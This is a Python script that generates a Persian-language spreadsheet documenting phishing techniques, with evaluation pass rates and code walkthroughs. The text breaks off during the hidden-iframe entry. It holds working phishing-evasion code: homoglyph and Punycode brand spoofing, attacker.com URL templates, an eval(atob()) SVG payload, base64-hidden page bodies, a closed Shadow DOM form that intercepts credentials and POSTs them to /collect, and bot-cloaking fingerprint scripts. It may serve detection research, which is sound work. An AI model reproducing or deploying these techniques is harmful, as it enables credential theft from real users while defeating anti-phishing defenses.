"""
Generate phishing_technique_documentation.xlsx

Sheets:
  1. خلاصه ارزیابی  — overview table with pass/fail per technique
  2. مستندات تکنیک‌ها — full detail per technique including new
     "توضیح کد و تولید HTML" column that walks through the Python code.
"""

import pathlib
import openpyxl
from openpyxl.styles import Font, PatternFill, Alignment, Border, Side
from openpyxl.utils import get_column_letter

EVAL_RESULTS = {
    "T01": {"pass_rate": 93, "passed": 679, "failed": 50,  "avg_score": 0.929, "failure_type": "data"},
    "T02": {"pass_rate":100, "passed": 697, "failed":  0,  "avg_score": 0.750, "failure_type": "none"},
    "T03": {"pass_rate":100, "passed": 746, "failed":  0,  "avg_score": 0.867, "failure_type": "none"},
    "T04": {"pass_rate":100, "passed": 705, "failed":  0,  "avg_score": 0.750, "failure_type": "none"},
    "T05": {"pass_rate":100, "passed": 746, "failed":  0,  "avg_score": 0.750, "failure_type": "none"},
    "T06": {"pass_rate":100, "passed": 684, "failed":  0,  "avg_score": 0.750, "failure_type": "none"},
    "T07": {"pass_rate": 45, "passed":  91, "failed":108,  "avg_score": 0.298, "failure_type": "data"},
    "T08": {"pass_rate": 42, "passed":  86, "failed":115,  "avg_score": 0.285, "failure_type": "data"},
    "T09": {"pass_rate":100, "passed": 195, "failed":  0,  "avg_score": 0.750, "failure_type": "none"},
    "T10": {"pass_rate": 88, "passed": 327, "failed": 42,  "avg_score": 0.591, "failure_type": "data"},
    "T11": {"pass_rate": 95, "passed": 163, "failed":  8,  "avg_score": 0.715, "failure_type": "data"},
    "T12": {"pass_rate":100, "passed": 227, "failed":  0,  "avg_score": 0.800, "failure_type": "none"},
    "T13": {"pass_rate":100, "passed": 227, "failed":  0,  "avg_score": 0.800, "failure_type": "none"},
    "T14": {"pass_rate":100, "passed": 226, "failed":  0,  "avg_score": 0.750, "failure_type": "none"},
    "T15": {"pass_rate":100, "passed": 227, "failed":  0,  "avg_score": 0.750, "failure_type": "none"},
    "T16": {"pass_rate":100, "passed": 227, "failed":  0,  "avg_score": 0.750, "failure_type": "none"},
    "T17": {"pass_rate":100, "passed": 226, "failed":  0,  "avg_score": 0.749, "failure_type": "none"},
    "T18": {"pass_rate":100, "passed": 226, "failed":  0,  "avg_score": 0.663, "failure_type": "none"},
    "T19": {"pass_rate":100, "passed": 227, "failed":  0,  "avg_score": 0.800, "failure_type": "none"},
    "T20": {"pass_rate":100, "passed": 272, "failed":  0,  "avg_score": 0.833, "failure_type": "none"},
    "T21": {"pass_rate":100, "passed": 182, "failed":  0,  "avg_score": 0.800, "failure_type": "none"},
    "T22": {"pass_rate":100, "passed": 226, "failed":  0,  "avg_score": 0.800, "failure_type": "none"},
    "T23": {"pass_rate":  0, "passed":   0, "failed":226,  "avg_score": 0.000, "failure_type": "dependency"},
    "T24": {"pass_rate": 53, "passed": 105, "failed": 90,  "avg_score": 0.409, "failure_type": "data"},
    "T25": {"pass_rate":100, "passed": 258, "failed":  0,  "avg_score": 0.750, "failure_type": "none"},
}

TECHNIQUES_DOC = [

    (1, "T01",
     "دستکاری URL – گروه ۱",
     "Homoglyph / Confusable Characters\nجعل دامنه با کاراکترهای مشابه",
     "جایگزینی حروف URL با کاراکترهای یونیکد Cyrillic/یونانی که از نظر بصری یکسان "
     "هستند (a→а، e→е، o→о) یا اعمال ترفندهای Digraph (li→h، rn→m). "
     "نتیجه: دامنه‌ای که در نوار آدرس مرورگر با دامنه اصلی اشتباه گرفته می‌شود.",
     "۱. parse_url(url) – تجزیه URL به اجزا\n"
     "۲. جدا کردن label ثبت‌شده با split_domain_labels()\n"
     "۳. _mutate(label, cyrillic_map, density=0.5):\n"
     "   a) اعمال DIGRAPH_TRICKS (li→h، rn→m، cl→d، vv→w)\n"
     "   b) هر کاراکتر با احتمال density جایگزین می‌شود\n"
     "۴. تضمین حداقل ۱ جایگزینی\n"
     "۵. rebuild_url() برای بازسازی URL کامل",
     "URL معتبر ASCII\nدامنه با حروف دارای نگاشت Cyrillic/Greek",
     "modified_url: URL با دامنه جعل‌شده\nHTML تغییر نمی‌کند",
     "50 شکست داده‌محور: دامنه‌هایی که فقط از حروف بدون نگاشت تشکیل شده‌اند (مثل uk.ac.ir)",
     "فایل: app/techniques/group1_url/t01_homoglyph.py\n"
     "کتابخانه‌ها: app/utils/homoglyph_map.py (CHAR_SETS، DIGRAPH_TRICKS)\n\n"
     "۱. CHAR_SETS['cyrillic'] یک dict است مثل {'a':'а', 'e':'е', 'o':'о', ...}\n"
     "   این نگاشت دستی نوشته شده — هر جفت بصری یکسان است اما کدپوینت Unicode متفاوت دارند.\n\n"
     "۲. تابع _mutate() دو مرحله دارد:\n"
     "   مرحله اول — Digraph: رشته‌هایی مثل 'li' با 'h' جایگزین می‌شوند چون در فونت‌های\n"
     "   خاص شبیه به هم هستند. این قبل از جایگزینی کاراکتر‌ها اعمال می‌شود.\n"
     "   مرحله دوم — هر کاراکتر بررسی می‌شود: اگر در cyrillic_map بود و random() < density\n"
     "   بود، کاراکتر Cyrillic جایگزین می‌شود. نتیجه: 'microsoft' → 'mіcrosoft' (i=Cyrillic).\n\n"
     "۳. URL خروجی مثلاً https://mіcrosoft.com است — به ظاهر عادی اما با کاراکتر Cyrillic.\n"
     "   مرورگر این را به‌صورت punycode نمایش می‌دهد یا مستقیم — بسته به مرورگر.\n\n"
     "خروجی HTML: فایل HTML تولید نمی‌شود — فقط URL تغییر می‌کند.\n"
     "خروجی در summary.csv: modified_url ستون مقدار دارد، html_path خالی است."),

    (2, "T02",
     "دستکاری URL – گروه ۱",
     "Punycode / IDN Homoglyph\nدامنه بین‌المللی با Punycode",
     "ساخت دامنه IDN (Internationalized Domain Name) با کدگذاری Punycode (xn--). "
     "مرورگر دامنه xn-- را به شکل Unicode نمایش می‌دهد که با دامنه اصلی شبیه است.",
     "۱. parse_url(url) – تجزیه URL\n"
     "۲. برای هر label دامنه:\n"
     "   a) اگر Punycode بود: ابتدا decode به Unicode\n"
     "   b) جایگزینی کاراکترها با معادل Cyrillic از CHAR_SETS\n"
     "   c) رشته Unicode را با str.encode('idna') تبدیل به xn-- می‌کنیم\n"
     "۳. اتصال label های جدید با '.' و rebuild_url()\n"
     "نتیجه: URL با دامنه xn-- که در Chrome/Firefox به شکل شبیه اصل نمایش می‌یابد",
     "URL معتبر\nدامنه با حروف قابل‌تبدیل به IDN",
     "modified_url: URL با دامنه xn-- (Punycode)\nHTML تغییر نمی‌کند",
     "هیچ شکستی — ۱۰۰٪ موفق",
     "فایل: app/techniques/group1_url/t02_punycode.py\n"
     "کتابخانه: Python built-in str.encode('idna') برای تبدیل Unicode → Punycode\n\n"
     "۱. هر label دامنه مثل 'google' جداگانه پردازش می‌شود.\n"
     "   ابتدا کاراکترهای Cyrillic جایگزین می‌شوند: 'google' → 'gооgle' (o=Cyrillic)\n"
     "   سپس 'gооgle'.encode('idna') این را به b'xn--ggle-55da' تبدیل می‌کند.\n\n"
     "۲. encode('idna') استاندارد RFC 3492 (Punycode) را پیاده‌سازی می‌کند.\n"
     "   این encoding یک label معتبر DNS می‌سازد که در سرورهای DNS ثبت‌شدنی است.\n\n"
     "۳. نتیجه نهایی مثلاً https://xn--ggle-55da.com است.\n"
     "   وقتی Chrome این URL را می‌بیند و دامنه در IDN allowlist نیست،\n"
     "   به شکل ASCII نمایش می‌دهد. Firefox ممکن است Unicode نمایش دهد.\n\n"
     "خروجی HTML: فایل HTML تولید نمی‌شود — فقط URL تغییر می‌کند."),

    (3, "T03",
     "دستکاری URL – گروه ۱",
     "Look-alike + Leetspeak + Trust Words\nزیردامنه مشابه با کلمات اعتمادساز",
     "ساخت دامنه مستقل یا زیردامنه‌ای که نام برند هدف را با کلمات اعتمادساز (login، "
     "secure، verify) ترکیب می‌کند و Leetspeak (e→3، a→4، i→1) اعمال می‌کند.",
     "۱. استخراج label برند از split_domain_labels()\n"
     "۲. انتخاب trust_words تصادفی از لیست (login, secure, verify, account)\n"
     "۳. _leetify(word, density=0.4): جایگزینی کاراکترها با LEET_MAP\n"
     "۴. ترکیب: leet_brand + '-' + leet_trust_word + '.' + tld\n"
     "۵. استراتژی standalone: دامنه مستقل مثل log1n-bm1.ir",
     "URL معتبر با TLD",
     "modified_url: دامنه جعلی با trust words\nHTML تغییر نمی‌کند",
     "هیچ شکستی — ۱۰۰٪ موفق",
     "فایل: app/techniques/group1_url/t03_lookalike.py\n"
     "کتابخانه: app/utils/homoglyph_map.py (LEET_MAP: {'a':['4','@'], 'e':['3'], ...})\n\n"
     "۱. LEET_MAP دیکشنری است که هر حرف را به جایگزین‌های leet نگاشت می‌کند.\n"
     "   مثال: 'a' → ['4', '@'], 'i' → ['1', '!'], 'e' → ['3']\n\n"
     "۲. تابع _leetify() روی هر کاراکتر یک بار random() می‌زند.\n"
     "   اگر کاراکتر در LEET_MAP بود و random() < leet_density باشد، جایگزین می‌شود.\n"
     "   'microsoft' با density=0.4 ممکن است به 'micros0ft' یا 'm1crosoft' تبدیل شود.\n\n"
     "۳. trust_words از یک لیست از پیش‌تعریف‌شده انتخاب می‌شوند:\n"
     "   فارسی: ['ورود', 'تأیید', 'حساب', 'امن', ...]\n"
     "   انگلیسی: ['login', 'secure', 'verify', 'account', ...]\n"
     "   زبان بر اساس detect_language(html, url) تعیین می‌شود.\n\n"
     "۴. URL نهایی مثلاً https://log1n-bm1.ir است — شبیه یک URL بانک ملی ایران.\n\n"
     "خروجی HTML: فایل HTML تولید نمی‌شود — فقط URL تغییر می‌کند."),

    (4, "T04",
     "دستکاری URL – گروه ۱",
     "Long URL Padding\nپدینگ URL با مسیر بلند",
     "افزودن بخش‌های مسیر اضافی به URL مهاجم تا قربانی در نمایش کوتاه‌شده ایمیل/SMS "
     "نام سایت اصلی را در URL ببیند ولی در واقع دامنه مهاجم در ابتدا قرار دارد.",
     "۱. استخراج netloc هدف از URL\n"
     "۲. انتخاب تصادفی template از الگوهای URL بلند\n"
     "۳. درج netloc هدف در path URL مهاجم\n"
     "۴. افزودن query parameters تصادفی (uuid)\n"
     "۵. اطمینان از طول > ۸۰ کاراکتر",
     "URL معتبر",
     "modified_url: URL بلند با netloc هدف در path\nHTML تغییر نمی‌کند",
     "هیچ شکستی — ۱۰۰٪ موفق",
     "فایل: app/techniques/group1_url/t04_long_url.py\n\n"
     "۱. الگوهای URL بلند از پیش‌تعریف‌شده‌اند مثل:\n"
     "   'https://attacker.com/{target}/login/verify/account?ref={uuid}'\n"
     "   یا 'https://attacker.com/security/{target}/authenticate?session={uuid}'\n\n"
     "۲. {target} با netloc دامنه هدف جایگزین می‌شود.\n"
     "   مثلاً برای microsoft.com: \n"
     "   https://attacker.com/microsoft.com/login/verify?ref=a3f9b2c1\n\n"
     "۳. در ایمیل‌خوان‌هایی که URL را truncate می‌کنند، قربانی فقط:\n"
     "   https://attacker.com/microsoft.com/... می‌بیند و فکر می‌کند URL معتبر است.\n\n"
     "۴. UUID با secrets.token_urlsafe(8) تولید می‌شود.\n\n"
     "خروجی HTML: فایل HTML تولید نمی‌شود — فقط URL تغییر می‌کند."),

    (5, "T05",
     "دستکاری URL – گروه ۱",
     "Polymorphic URL\nURL پلی‌مورفیک با پارامترهای تصادفی",
     "افزودن پارامترهای تصادفی (UUID، token) به URL در هر تولید تا هیچ دو خروجی یکسان "
     "نباشند و سیستم‌های IDS مبتنی بر امضا نتوانند URL ثابتی را blacklist کنند.",
     "۱. parse_url(url) — تجزیه URL\n"
     "۲. اعمال یکی از سه استراتژی تصادفی:\n"
     "   • ngram_mutate: جابجایی n-gram در دامنه\n"
     "   • typo_mutate: تایپ مشابه صفحه‌کلید\n"
     "   • path_vary: افزودن random path segment\n"
     "۳. افزودن query params با secrets.token_urlsafe()\n"
     "۴. rebuild_url() با URL جدید",
     "URL معتبر",
     "modified_url: URL اصلی + params تصادفی\nHTML تغییر نمی‌کند",
     "هیچ شکستی — ۱۰۰٪ موفق",
     "فایل: app/techniques/group1_url/t05_polymorphic.py\n\n"
     "۱. سه تابع mutation هر بار به‌صورت تصادفی انتخاب می‌شوند:\n"
     "   _ngram_mutate(): دو کاراکتر مجاور در دامنه جابجا می‌شوند\n"
     "     مثال: 'google' → 'oogle' → 'oggle'\n"
     "   _typo_mutate(): یک کاراکتر با همسایه صفحه‌کلید جایگزین می‌شود\n"
     "     مثال: 'google' → 'googlr' (r کنار e در کیبورد)\n"
     "   _path_vary(): یک path segment تصادفی اضافه می‌شود\n"
     "     مثال: /login?session=f8a2b3c4&v=7d9e\n\n"
     "۲. secrets.token_urlsafe(8) برای query params — این cryptographically random است\n"
     "   بنابراین هیچ دو URL یکسان نخواهند بود.\n\n"
     "۳. نتیجه: هر بار اجرا URL متفاوتی تولید می‌شود — signature-based detection شکست می‌خورد.\n\n"
     "خروجی HTML: فایل HTML تولید نمی‌شود — فقط URL تغییر می‌کند."),

    (6, "T06",
     "دستکاری URL – گروه ۱",
     "Redirect Chain\nزنجیره ریدایرکت",
     "ساخت صفحه HTML انتظار که برند سایت هدف را نشان می‌دهد و بعد از چند ثانیه به URL "
     "فیشینگ هدایت می‌کند. قربانی URL اولیه معتبر می‌بیند، مرورگر بعداً جابجا می‌شود.",
     "۱. detect_language(html, url) — زبان صفحه\n"
     "۲. استخراج نام دامنه برای نمایش\n"
     "۳. ساخت هوپ‌های میانی (N هوپ) با URL های CDN جعلی\n"
     "۴. _build_redirect_page(): HTML با:\n"
     "   • meta http-equiv='refresh' content='3;url=TARGET'\n"
     "   • window.location.replace(TARGET) به‌عنوان fallback JS\n"
     "   • spinner انیمیشن و متن فارسی/انگلیسی\n"
     "۵. اعمال open-redirect template (مثل google.com/url?q=...)",
     "URL معتبر\n(اختیاری) HTML برای زبان‌شناسی",
     "modified_html: HTML صفحه ریدایرکت\nmodified_url: URL صفحه ریدایرکت",
     "هیچ شکستی — ۱۰۰٪ موفق\n(زبان فارسی برای .ir بعد از fix)",
     "فایل: app/techniques/group1_url/t06_redirect.py\n\n"
     "۱. کد ابتدا با detect_language(html, url) زبان تشخیص می‌دهد.\n"
     "   برای دامنه‌های .ir همیشه 'fa' (فارسی) برمی‌گردد — این fix قبلی ما است.\n\n"
     "۲. تابع _build_redirect_page() یک HTML کامل می‌سازد:\n"
     "   <meta http-equiv='refresh' content='3;url={target}'> — بعد از 3 ثانیه redirect\n"
     "   <script>setTimeout(()=>location.replace('{target}'), 3000)</script> — JS fallback\n"
     "   متن «لطفاً منتظر بمانید…» از i18n catalog بر اساس زبان\n"
     "   spinner CSS animation برای ظاهر واقعی\n\n"
     "۳. open-redirect wrapping: اگر template تعریف شده باشد، URL نهایی از طریق\n"
     "   یک open redirect معتبر (مثل google.com/url?q=) عبور می‌کند.\n"
     "   این باعث می‌شود URL اولیه دامنه Google باشد.\n\n"
     "خروجی HTML: فایل __T06.html — یک صفحه انتظار با redirect خودکار."),

    (7, "T07",
     "تقلید بصری – گروه ۲",
     "Logo Edit (Pixel Shift / Hue-rotate)\nویرایش لوگو با تغییر رنگ",
     "استخراج لوگوی برند از HTML سایت هدف و اعمال تغییر رنگ (hue-rotate CSS یا pixel "
     "shift با Pillow) تا ظاهر برند در صفحه فیشینگ حفظ شود.",
     "۱. find_brand_logo(soup) — پیدا کردن img/link=icon\n"
     "۲. دانلود bytes تصویر از src\n"
     "۳. اگر PNG: PIL Image.open() → ImageEnhance.Brightness() + pixel RGB shift\n"
     "۴. اگر SVG/link: اعمال CSS filter:hue-rotate(15deg) روی تگ\n"
     "۵. Embed نتیجه به‌عنوان data: URI در HTML\n"
     "۶. ذخیره PNG جداگانه در extra_files",
     "HTML با img/link logo\nشبکه برای دانلود\nPillow نصب‌شده",
     "modified_html: HTML با لوگوی تغییریافته\nextra_files: logo_edit.png",
     "108 شکست داده‌محور: سایت‌هایی بدون لوگوی قابل استخراج",
     "فایل: app/techniques/group2_visual/t07_logo_edit.py\n"
     "کتابخانه‌ها: Pillow (PIL) — Image, ImageEnhance; BeautifulSoup — find_brand_logo()\n\n"
     "۱. find_brand_logo() یک heuristic است که:\n"
     "   ابتدا rel='apple-touch-icon' یا rel='shortcut icon' را می‌گردد\n"
     "   سپس اولین <img> بزرگ‌تر از 50x50 را پیدا می‌کند\n"
     "   اگر چیزی نبود None برمی‌گرداند → تکنیک skip می‌شود\n\n"
     "۲. برای PNG: bytes → PIL Image.open() → تبدیل به RGB\n"
     "   pixel_shift: هر pixel RGB را به‌اندازه delta تغییر می‌دهد\n"
     "   ImageEnhance.Brightness(img).enhance(1.02) — روشنایی را کمی بالا می‌برد\n"
     "   تغییر به‌قدری کم است که بصری قابل تشخیص نیست\n\n"
     "۳. برای SVG: مستقیم CSS filter درون style attribute تگ اضافه می‌شود:\n"
     "   style='filter:hue-rotate(15deg) brightness(1.020)'\n"
     "   hue-rotate رنگ را در چرخه رنگ جابجا می‌کند\n\n"
     "۴. نتیجه به‌صورت data:image/png;base64,... embed می‌شود تا دانلود خارجی نیاز نباشد.\n\n"
     "خروجی HTML: فایل __T07.html — HTML اصلی با src لوگو به data URI تبدیل شده."),

    (8, "T08",
     "تقلید بصری – گروه ۲",
     "Favicon Spoofing\nجعل Favicon",
     "جایگزینی favicon سایت با آیکون واقعی برند هدف که از Google S2 API یا HTML هدف "
     "دریافت می‌شود تا تب مرورگر قربانی آیکون آشنا نمایش دهد.",
     "۱. بررسی HTML برای link[rel=icon|shortcut icon|apple-touch-icon]\n"
     "۲. اگر نبود: درخواست به google.com/s2/favicons?domain=X&sz=64\n"
     "۳. دانلود favicon bytes\n"
     "۴. اگر brightness_delta != 0: PIL ImageEnhance.Brightness() اعمال\n"
     "۵. تبدیل به data:image/png;base64,...\n"
     "۶. جایگزینی یا افزودن <link rel='shortcut icon'> در <head>",
     "HTML با <head>\nشبکه برای دانلود favicon",
     "modified_html: HTML با favicon جدید در <head>\nextra_files: favicon.png",
     "115 شکست داده‌محور: favicon غیرقابل دسترس",
     "فایل: app/techniques/group2_visual/t08_favicon.py\n"
     "کتابخانه‌ها: requests/httpx برای دانلود، Pillow برای تنظیم روشنایی، BS4\n\n"
     "۱. کد ابتدا HTML را parse می‌کند و دنبال link[rel] می‌گردد:\n"
     "   soup.find('link', rel=['icon','shortcut icon','apple-touch-icon'])\n"
     "   اگر href مطلق بود مستقیم دانلود می‌کند.\n\n"
     "۲. اگر favicon در HTML نبود: از Google S2 API استفاده می‌کند:\n"
     "   GET https://www.google.com/s2/favicons?domain=bmi.ir&sz=64\n"
     "   این API favicon واقعی هر سایت را برمی‌گرداند.\n\n"
     "۳. bytes دریافتی با PIL.Image.open(BytesIO(raw)) باز می‌شود.\n"
     "   اگر brightness_delta مثبت باشد، ImageEnhance.Brightness.enhance() اعمال می‌شود.\n"
     "   تغییر بسیار جزئی است — هدف تغییر hash فایل است نه ظاهر.\n\n"
     "۴. نتیجه PNG با base64.b64encode() encode شده در <link> گذاشته می‌شود.\n\n"
     "خروجی HTML: فایل __T08.html — HTML اصلی با favicon تغییریافته در <head>."),

    (9, "T09",
     "تقلید بصری – گروه ۲",
     "SVG Smuggling\nجاسازی payload در SVG",
     "درج محتوای مخرب (JavaScript، فرم، tracking pixel) درون فایل SVG که بصری "
     "به‌عنوان تصویر عادی نمایش داده می‌شود اما در مرورگرهای پشتیبانی‌کننده اجرا می‌شود.",
     "۱. پیدا کردن <img src='*.svg'> یا ساخت SVG جدید\n"
     "۲. ساخت payload JS با eval(atob('BASE64_PAYLOAD'))\n"
     "۳. درج <script> درون <defs> یا <g> در SVG\n"
     "۴. base64.b64encode(svg_string) برای کل SVG\n"
     "۵. embed به‌عنوان data:image/svg+xml;base64,...",
     "HTML\n(اختیاری) SVG موجود در صفحه",
     "modified_html: HTML با SVG جاسازی‌شده\nextra_files: smuggled.svg",
     "هیچ شکستی — ۱۰۰٪ موفق",
     "فایل: app/techniques/group2_visual/t09_svg_smuggling.py\n\n"
     "۱. payload JS به‌صورت base64 encode می‌شود:\n"
     "   js_code = 'fetch(\"/collect\",{method:\"POST\",body:JSON.stringify({...})})'\n"
     "   b64 = base64.b64encode(js_code.encode()).decode()\n"
     "   payload_tag = f'<script>eval(atob(\"{b64}\"))</script>'\n\n"
     "۲. این payload درون SVG جاسازی می‌شود:\n"
     "   <svg xmlns='http://www.w3.org/2000/svg' width='1' height='1'>\n"
     "     <defs><script>eval(atob('BASE64...'))</script></defs>\n"
     "     <rect width='1' height='1' fill='white'/>\n"
     "   </svg>\n\n"
     "۳. SVG کامل base64 می‌شود و در HTML به این شکل embed می‌شود:\n"
     "   <img src='data:image/svg+xml;base64,PHN2Zy...' width='1' height='1'\n"
     "        style='position:absolute;opacity:0;'>\n\n"
     "۴. وقتی مرورگر SVG را render می‌کند، <script> داخلش اجرا می‌شود.\n"
     "   Chrome اجرای script در SVG-as-img را block می‌کند اما SVG inline یا object اجرا می‌کند.\n\n"
     "خروجی HTML: فایل __T09.html — HTML اصلی با img حاوی SVG payload."),

    (10, "T10",
     "HTML / DOM / JS – گروه ۳",
     "Dynamic DOM Injection\nساخت پویای DOM با base64",
     "حذف کامل محتوای body از HTML و جاسازی آن به‌صورت base64 درون یک <script> که پس "
     "از بارگذاری صفحه اجرا می‌شود. ابزارهای اسکن استاتیک محتوا را نمی‌بینند.",
     "۱. parse_html(html) با BeautifulSoup\n"
     "۲. استخراج body.decode_contents()\n"
     "۳. escape کردن </script> در محتوا\n"
     "۴. base64.b64encode(body.encode('utf-8'))\n"
     "۵. خالی کردن body و درج <script>:\n"
     "   document.body.innerHTML = atob('BASE64...')\n"
     "۶. serialize_html(soup) برای خروجی",
     "HTML با body غیر خالی (≥ 20 بایت)",
     "modified_html: HTML با body خالی + JS reconstructor",
     "42 شکست داده‌محور: صفحات با body کمتر از 20 بایت",
     "فایل: app/techniques/group3_html/t10_dynamic_dom.py\n"
     "کتابخانه‌ها: Python base64، BeautifulSoup\n\n"
     "۱. کد HTML را با BeautifulSoup parse می‌کند:\n"
     "   soup = parse_html(html)\n"
     "   body_content = soup.find('body').decode_contents()  # کل innerHTML body\n\n"
     "۲. خطرناک‌ترین مشکل: اگر محتوا حاوی </script> باشد، script می‌شکند.\n"
     "   راه‌حل: body_content.replace('</script>', '<\\/script>')\n"
     "   سپس base64 همه مشکلات را حل می‌کند چون هیچ کاراکتر خاصی نمی‌ماند.\n\n"
     "۳. خروجی body اصلی حذف و این HTML جایگزین می‌شود:\n"
     "   <body></body>\n"
     "   <script>\n"
     "     document.addEventListener('DOMContentLoaded', function(){\n"
     "       document.body.innerHTML = atob('PHRhYmxlPjx0cj4...');\n"
     "     });\n"
     "   </script>\n\n"
     "۴. curl یا wget این HTML را دانلود می‌کنند — فقط body خالی می‌بینند.\n"
     "   مرورگر JS را اجرا می‌کند و atob() base64 را decode کرده، innerHTML را set می‌کند.\n\n"
     "خروجی HTML: فایل __T10.html — body خالی + یک script با کل محتوا encoded."),

    (11, "T11",
     "HTML / DOM / JS – گروه ۳",
     "Shadow DOM Encapsulation\nپنهان‌سازی در Shadow DOM",
     "انتقال فرم‌های ورودی به داخل Shadow Root که با document.querySelector() معمولی "
     "قابل دسترسی نیست. ابزارهای تجزیه‌وتحلیل DOM ساده فرم را نمی‌بینند.",
     "۱. یافتن <form> یا <input type=password> با BS4\n"
     "۲. base64.b64encode(form_html) برای encode محتوای فرم\n"
     "۳. ساخت div#__shadow_host__ در جای فرم اصلی\n"
     "۴. حذف فرم اصلی از DOM\n"
     "۵. درج <script> که:\n"
     "   a) host.attachShadow({mode:'closed'})\n"
     "   b) shadow.innerHTML = atob('BASE64_FORM')\n"
     "   c) submit handler → fetch('/collect', {body: FormData})",
     "HTML با <form> یا <input type=password>",
     "modified_html: HTML با Shadow DOM wrapper\nextra_files: shadow_host_snippet.html",
     "8 شکست داده‌محور: صفحات بدون form/input",
     "فایل: app/techniques/group3_html/t11_shadow_dom.py\n"
     "Shadow DOM یک استاندارد Web Components است — native مرورگر، نیاز به کتابخانه ندارد.\n\n"
     "۱. کد با BS4 دنبال form یا input[type=password] می‌گردد:\n"
     "   form = soup.find('form') or soup.find('input', type='password')\n"
     "   form_html = str(form)  # HTML کامل فرم\n\n"
     "۲. فرم اصلی از DOM حذف می‌شود و یک div جای آن می‌گیرد:\n"
     "   <div id='__shadow_host__'></div>\n\n"
     "۳. یک <script> درج می‌شود:\n"
     "   const h = document.getElementById('__shadow_host__');\n"
     "   const sr = h.attachShadow({mode: 'closed'});\n"
     "   sr.innerHTML = atob('BASE64_FORM...');\n"
     "   // submit intercept\n"
     "   sr.addEventListener('submit', e => {\n"
     "     e.preventDefault();\n"
     "     const fd = new FormData(e.target);\n"
     "     fetch('/collect', {method:'POST', body: JSON.stringify(Object.fromEntries(fd))})\n"
     "   });\n\n"
     "۴. mode:'closed' یعنی کد خارجی نمی‌تواند sr = host.shadowRoot بنویسد.\n"
     "   document.querySelector('input') هم NULL برمی‌گرداند چون shadow DOM مجزاست.\n\n"
     "خروجی HTML: فایل __T11.html — div placeholder + script که Shadow DOM را می‌سازد."),

    (12, "T12",
     "HTML / DOM / JS – گروه ۳",
     "CSS Hiding Techniques\nپنهان‌سازی عناصر با CSS",
     "پنهان‌کردن عناصر مخرب با CSS (position خارج از viewport، opacity:0، clip:rect) "
     "تا در سورس قابل‌مشاهده باشند اما در رندر مرورگر دیده نشوند.",
     "۱. Parse HTML با BS4\n"
     "۲. افزودن CSS class به <head>:\n"
     "   .__ph_hidden__{position:fixed;top:-9999px;clip:rect(0,0,0,0);}\n"
     "۳. درج عناصر decoy با class __ph_hidden__\n"
     "۴. قرار دادن tracking pixel با opacity:0\n"
     "۵. محتوای واقعی فیشینگ در عناصر visible",
     "HTML با <head> و <body>",
     "modified_html: HTML با hidden elements و decoys",
     "هیچ شکستی — ۱۰۰٪ موفق",
     "فایل: app/techniques/group3_html/t12_css_hiding.py\n\n"
     "۱. یک CSS rule به <head> اضافه می‌شود:\n"
     "   <style>\n"
     "   .__ph_hidden__{position:fixed;top:-9999px;left:-9999px;\n"
     "                  width:1px;height:1px;overflow:hidden;opacity:0;}\n"
     "   </style>\n\n"
     "۲. چند element decoy با این class اضافه می‌شوند:\n"
     "   <div class='__ph_hidden__' aria-hidden='true'>Legitimate looking content...</div>\n"
     "   این عناصر در اسکن سورس دیده می‌شوند اما در مرورگر نمایش ندارند.\n\n"
     "۳. Tracking pixel — یک 1x1 GIF invisible:\n"
     "   <img src='data:image/gif;base64,R0lGODlh...' style='opacity:0;position:fixed;'>\n"
     "   این data URI GIF شفاف 1x1 pixel است که hash آن مشخص است.\n\n"
     "۴. محتوای مخرب اصلی در div معمولی visible قرار می‌گیرد.\n"
     "   hidden elements فریب اسکنرهایی هستند که keyword search روی HTML می‌کنند.\n\n"
     "خروجی HTML: فایل __T12.html — HTML اصلی با CSS rules و hidden decoy elements."),

    (13, "T13",
     "HTML / DOM / JS – گروه ۳",
     "Browser Fingerprinting & Conditional Rendering\nاثرانگشت مرورگر",
     "جمع‌آوری canvas hash، WebGL، UserAgent، mouse events — اگر bot شناسایی شد صفحه "
     "خالی نمایش داده می‌شود، اگر انسان بود صفحه فیشینگ نمایش داده می‌شود.",
     "۱. ساخت <script> JavaScript fingerprinting\n"
     "۲. Canvas: createElement+getContext+drawText → toDataURL() → length\n"
     "۳. WebGL: getExtension → renderer/vendor string\n"
     "۴. navigator.webdriver → true = bot\n"
     "۵. setTimeout: اگر در N ms هیچ mouse/key event نبود → bot\n"
     "۶. score < threshold → document.body.innerHTML=''\n"
     "۷. hidden inputs با fingerprint داده‌ها",
     "HTML با <head>",
     "modified_html: HTML با fingerprinting script و hidden fields",
     "هیچ شکستی — ۱۰۰٪ موفق",
     "فایل: app/techniques/group4_antibot/t13_fingerprint.py\n\n"
     "۱. Script یک 'score' محاسبه می‌کند. هر سیگنال انسانی score++ می‌کند:\n"
     "   if(navigator.webdriver) score-- // Selenium/Puppeteer\n"
     "   if(navigator.plugins.length == 0) score-- // بدون plugin = headless\n"
     "   if(navigator.languages.length == 0) score-- // بدون زبان = bot\n"
     "   Canvas test: اگر canvas.toDataURL().length > 100 باشد → مرورگر واقعی\n"
     "   WebGL test: اگر renderer شامل 'SwiftShader' باشد → headless Chrome\n\n"
     "۲. Mouse movement detection:\n"
     "   document.addEventListener('mousemove', () => { score += 2; });\n"
     "   اگر بعد از check_delay_ms میلی‌ثانیه هیچ حرکت موسی نبود → احتمالاً bot\n\n"
     "۳. تصمیم‌گیری:\n"
     "   if(score >= threshold) { /* نمایش محتوا */ }\n"
     "   else { document.body.innerHTML = ''; // صفحه خالی برای bot }\n\n"
     "۴. اطلاعات fingerprint در hidden inputs ذخیره می‌شوند تا با credentials ارسال شوند.\n\n"
     "خروجی HTML: فایل __T13.html — HTML اصلی با script fingerprinting در <head>."),

    (14, "T14",
     "HTML / DOM / JS – گروه ۳",
     "Hidden iframes / GhostFrame\nتزریق iframe پنهان",
     "درج iframeهای zero-size یا off-screen که محتوا از سرور مهاجم بارگذاری می‌کنند. "
     "اسکنرهای anti-phishing معمولاً iframe بدون سایز visible را skip می‌کنند.",
     "۱. Parse HTML با BS4\n"
     "۲. تعیین iframe_src (مثلاً /login روی همان host)\n"
     "۳. ساخت style: position:fixed;top:-1px;left:-1px;width:1px;height:1px\n"
     "۴. درج N iframe با sandbox و loading=lazy\n"
     "۵. درج JS postMessage listener برای ارتباط",
     "HTML با <body>",
     "modified_html: HTML با hidden overlay iframes",
     "هیچ شکستی — ۱۰۰٪ موفق",
     "فایل: app/techniques/group3_html/t14_iframe.py\n\n"
     "۱. iframe با این style درج می‌شود:\n"
     "   <iframe src='https://target.com/login'\n"
     "           style='position:fixed;top:-1px;left:-1px;width:1px;height:1px;opacity:0;'\n"
     "           sandbox='allow-scripts allow-forms'\n"
     "           loading='lazy'\n"
